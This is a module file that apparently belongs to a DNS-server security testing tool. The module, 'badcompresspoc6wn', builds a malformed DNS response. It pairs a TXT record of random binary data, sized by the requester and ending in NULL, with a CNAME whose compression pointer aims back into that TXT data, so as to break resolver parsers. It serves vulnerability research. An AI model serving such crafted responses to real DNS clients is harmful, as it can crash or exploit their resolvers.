[module]
name = "badcompresspoc6wn"
type = "feature"
info = ""
desc = ""
author = "ivan.jedek@oryxlabs.com"
category = "Bad compression"

code = '''
if req.first_subdomain.startswith("badcompresspoc6wn"):
   # Send random binary TXT record of arbitrary size ending with NULL
   # + CNAME with compression pointing to the previous TXT record
   txtsize = 10
   if req.subdomains[1].isnumeric():
      txtsize = int(req.subdomains[1])
   ### DNS header ########
   buffer = prep_dns_header(b'\x84\x00', req.QURR, 2, 0, 0)
   ### QUESTION SECTION ########
   if resp.noq: buffer += convDom2Bin(req.full_domain) + req.type_bin + req.class_bin
   ### ANSWER SECTION ########
   data    = os.urandom(txtsize)
   databin  = struct.pack(">B", len(data)+2)
   databin += struct.pack(">B", len(data))
   databin += data + b"\x00"
   # TXT
   buffer += b'\xc0\x0c' if resp.compress else convDom2Bin(req.full_domain)
   buffer += getTypeBin("TXT") + getClassBin("IN")
   buffer += struct.pack(">L", resp.TTL)            ## TTL
   buffer += struct.pack(">H", len(databin))        ## Data length
   buffer += databin
   # CNAME
   offset_to_the_txt = (len(req.full_domain)*2) + 18 + 13 ## backward pointer to the previous TXT record
   databin = b"\xc0" + struct.pack(">B", offset_to_the_txt)
   buffer += b'\xc0\x0c' if resp.compress else convDom2Bin(req.full_domain)
   buffer += getTypeBin("CNAME") + getClassBin("IN")
   buffer += struct.pack(">L", resp.TTL)            ## TTL
   buffer += struct.pack(">H", len(databin))        ## Data length
   buffer += databin
   # log and send
   log("TXT + CNAME (poc6 with NULL)")
   send_buf(self, buffer)
   #####################################################################
'''
